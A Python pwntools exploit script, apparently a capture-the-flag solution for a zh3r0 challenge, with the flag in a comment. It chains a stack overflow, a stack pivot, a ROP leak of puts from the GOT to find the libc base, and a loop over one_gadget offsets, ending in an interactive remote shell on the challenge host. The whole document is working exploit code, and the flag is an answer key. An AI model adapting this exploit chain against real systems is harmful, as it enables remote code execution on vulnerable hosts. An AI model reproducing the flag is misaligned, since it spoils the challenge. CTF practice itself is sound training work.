#exploit for help
#flag=zh3r0{thanks_somuch_for_helping_my_friend____btw_please_DM_me_what_solution_did_you_use}
from pwn import *
import time
libc=ELF('/media/sf_kalishared/tools/The_Night-master/libcs/libc6_2.27-3ubuntu1_amd64.so')

gadgets=[0x4f322,0x10a38c,0x10a398,0xe569f,0xe5863,0xe5858,0x4f2c5,0xe585f]
for gadget in gadgets:

	target=remote('asia.pwn.zh3r0.ml', 7412)
	print(target.recvlines(5))
	
	pivotloc=0x601100
	poprdi=0x400943
	poprspr13r14r15=0x40093d
	putsgot=0x601018
	putsplt=0x4005d0
	func=0x400717

	target.send("A"*0x28+"\x17")

	payload=p64(0)*3
	payload+=p64(poprdi)
	payload+=p64(putsgot)
	payload+=p64(putsplt)
	payload+=p64(func)
	payload+="\x00"*7
	print(target.recvline())
	target.sendline(payload)
	print(target.recvline())

	payload="A"*0x28+p64(poprspr13r14r15)+p64(pivotloc)
	target.sendline(payload)

	libc_puts=u64(target.recvline().strip("\n")[0:6].ljust(8,"\x00"))
	libc_base=libc_puts-libc.symbols["puts"]
	libc_gadget=libc_base+gadget
		
	pause()
	target.sendline("1")
	payload="A"*0x28
	payload+=p64(libc_gadget)
	
	target.send(payload)
	
	target.interactive()
